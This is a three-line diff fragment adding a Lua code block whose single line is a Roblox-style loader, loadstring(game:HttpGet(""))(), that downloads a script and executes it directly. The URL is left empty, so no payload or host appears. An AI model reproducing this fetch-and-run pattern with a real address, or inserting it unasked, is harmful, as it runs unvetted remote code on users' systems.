@@ -1,0 +1,3 @@
+```lua
+loadstring(game:HttpGet(""))()
+```
